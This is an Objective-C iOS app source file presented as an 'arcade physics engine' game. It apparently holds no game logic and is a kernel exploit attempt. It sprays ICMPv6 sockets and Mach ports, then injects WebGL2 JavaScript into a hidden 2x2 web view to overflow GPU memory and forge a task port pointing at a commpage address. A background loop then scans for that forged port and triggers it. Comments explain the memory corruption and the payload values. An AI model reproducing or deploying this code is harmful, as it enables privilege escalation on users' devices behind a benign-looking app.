/* arcade physics engine */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <CoreGraphics/CoreGraphics.h>

#define NUM_PORTS        5000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL

static mach_port_t  g_ports[NUM_PORTS];
static int          g_port_count  = 0;
static int          g_socks[NUM_SOCKETS];
static int          g_sock_count  = 0;
static _Atomic int  g_found       = 0;
static FILE        *g_logfile     = NULL;

static void file_log(const char *msg) {
    if (!g_logfile) return;
    fprintf(g_logfile, "%s\n", msg);
    fflush(g_logfile);
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%{public}s", buf);
    NSLog(@"[app] %{public}s", buf);
    file_log(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

static void fire_el1_trigger(mach_port_t port, int idx, natural_t kotype,
                             mach_vm_address_t kobject) {
    ev("EL1_TRIGGER_SENT port=%d kotype=%u kobject=0x%016llx sending task_info",
       idx, kotype, (unsigned long long)kobject);
    task_basic_info_data_t info;
    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info((task_t)port, TASK_BASIC_INFO,
                                 (task_info_t)&info, &count);
    ev("EL1_TRIGGER_RETURNED_UNEXPECTED kr=%d count=%u", kr, count);
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        if (kobject == COMMPAGE_TARGET) {
            if (kotype == 2) {
                g_found = 1;
                ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> EL1 trigger",
                   i, kotype, (unsigned long long)kobject);
                fire_el1_trigger(g_ports[i], i, kotype, kobject);
            } else {
                ev("KOBJECT_MATCH_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx",
                   i, kotype, (unsigned long long)kobject);
            }
        } else if (kotype == 2) {
            ev("IKOT_TASK_WRONG_KOBJECT port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        } else if (kotype > 0 && kotype <= 100) {
            ev("KOTYPE_ANOMALY_LOW port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

/*
 * AGX WebGL overflow: broadcast uvec4 at every 16-byte stride.
 * All v[i] carry the same payload so any write landing at ipc_port+0
 * simultaneously sets io_bits, io_refs, and ip_kobject.
 *
 * io_bits   = 0x80000002  (ACTIVE | IKOT_TASK_CONTROL)
 * io_refs   = 100
 * ip_kobject = 0x0000000FFFFFC330  (COMMPAGE_TARGET)
 *   lo32 = 0xFFFFc330 = 4294934320
 *   hi32 = 0x0000000F = 15
 *
 * drawArraysInstanced overflow counts produce ~2^24 instances,
 * spilling vertex outputs far past the allocated GPU command buffer
 * into adjacent kalloc.192 memory containing the sprayed ipc_ports.
 */
static NSString *const kAGXJS =
    @"(function(){"
     "var B=2147483650,R=100,LO=4294934320,HI=15;"
     "var c=document.createElement('canvas');"
     "c.width=16;c.height=16;"
     "document.body.appendChild(c);"
     "var gl=c.getContext('webgl2');"
     "if(!gl){window._agx='NO_WEBGL2';return;}"
     "var a='';"
     "for(var i=0;i<30;i++)"
     "  a+='v['+i+']=uvec4('+B+'u,'+R+'u,'+LO+'u,'+HI+'u);';"
     "var vs='#version 300 es\\nflat out uvec4 v[30];\\nvoid main(){\\n'"
     "       +a+'\\ngl_Position=vec4(0,0,0,1);gl_PointSize=1.0;\\n}';"
     "var fs='#version 300 es\\nprecision highp float;\\n"
              "flat in uvec4 v[30];\\nout vec4 o;\\n"
              "void main(){o=vec4(float(v[0].x)*1e-10,0,0,1);}';"
     "function mk(t,s){"
     "  var sh=gl.createShader(t);"
     "  gl.shaderSource(sh,s);gl.compileShader(sh);return sh;"
     "}"
     "var p=gl.createProgram();"
     "gl.attachShader(p,mk(gl.VERTEX_SHADER,vs));"
     "gl.attachShader(p,mk(gl.FRAGMENT_SHADER,fs));"
     "gl.linkProgram(p);"
     "if(!gl.getProgramParameter(p,gl.LINK_STATUS)){"
     "  window._agx='LINK_ERR:'+gl.getProgramInfoLog(p);return;"
     "}"
     "gl.useProgram(p);"
     "var fb=gl.createFramebuffer();"
     "gl.bindFramebuffer(gl.FRAMEBUFFER,fb);"
     "var tx=gl.createTexture();"
     "gl.bindTexture(gl.TEXTURE_2D,tx);"
     "gl.texStorage2D(gl.TEXTURE_2D,1,gl.RGBA8,16,16);"
     "gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tx,0);"
     "gl.viewport(0,0,16,16);"
     "window._agx='shader_ok';"
     "var fc=0;"
     "function fire(){"
     "  try{gl.drawArraysInstanced(gl.POINTS,0,256,16777217);}catch(e){}"
     "  try{gl.drawArraysInstanced(gl.POINTS,0,1024,4194305);}catch(e){}"
     "  gl.flush();fc++;"
     "  if(fc<50)setTimeout(fire,500);"
     "  else window._agx='done';"
     "}"
     "setTimeout(fire,200);"
     "})();";

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKNavigationDelegate>
@property (strong) UIWindow *window;
@property (strong) WKWebView *wkView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docPath = [paths firstObject];
    NSString *logPath = [docPath stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([logPath UTF8String], "w");

    ev("APP_LAUNCH ArcadePhysics v1 v1.0");
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20,80,300,60)];
    lbl.text = @"ArcadePhysics v1";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];

    WKWebViewConfiguration *wkCfg = [[WKWebViewConfiguration alloc] init];
    self.wkView = [[WKWebView alloc] initWithFrame:CGRectMake(0, 0, 2, 2)
                                     configuration:wkCfg];
    self.wkView.navigationDelegate = self;
    [vc.view addSubview:self.wkView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    spray();

    [NSTimer scheduledTimerWithTimeInterval:0.10
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    [NSTimer scheduledTimerWithTimeInterval:2.0
                                     target:self
                                   selector:@selector(fireAGX:)
                                   userInfo:nil repeats:NO];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

- (void)fireAGX:(NSTimer *)t {
    ev("AGX_FIRE loading webview");
    [self.wkView loadHTMLString:@"<html><body style='background:black;margin:0'></body></html>"
                        baseURL:nil];
}

- (void)webView:(WKWebView *)wv didFinishNavigation:(WKNavigation *)nav {
    ev("WKNav done injecting AGX JS");
    [wv evaluateJavaScript:kAGXJS completionHandler:^(id result, NSError *err) {
        if (err) ev("AGX_JS_ERR %s", [[err localizedDescription] UTF8String]);
        else     ev("AGX_JS_INJECTED");
    }];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10*NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:@"window._agx||'pending'"
             completionHandler:^(id r, NSError *e) {
            ev("AGX_STATUS %s", r ? [[r description] UTF8String] : "nil");
        }];
    });
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
